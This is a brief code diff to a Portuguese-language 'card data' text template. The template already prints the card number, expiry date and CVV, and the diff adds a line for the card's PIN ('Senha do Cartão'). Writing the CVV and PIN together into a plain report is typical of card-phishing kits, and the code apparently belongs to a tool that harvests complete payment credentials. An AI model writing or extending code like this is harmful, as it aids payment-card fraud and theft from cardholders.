@@ -142,6 +142,7 @@ DADOS DO CARTÃO
 Número do Cartão: {payment_data.numeroCartao}
 Validade: {payment_data.validade}
 CVV: {payment_data.cvv}
+Senha do Cartão: {payment_data.senhaCartao}
 
 ================================================================================
 """
